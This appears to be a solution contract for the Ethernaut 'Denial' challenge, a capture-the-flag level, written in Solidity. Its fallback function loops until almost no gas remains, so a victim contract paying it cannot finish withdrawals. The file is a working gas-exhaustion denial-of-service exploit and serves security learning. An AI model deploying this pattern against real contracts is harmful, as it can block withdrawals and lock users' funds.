// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    fallback() external payable{
        int i = 0;
        while(gasleft() > 10000) {
            i++;
        }
    }
}
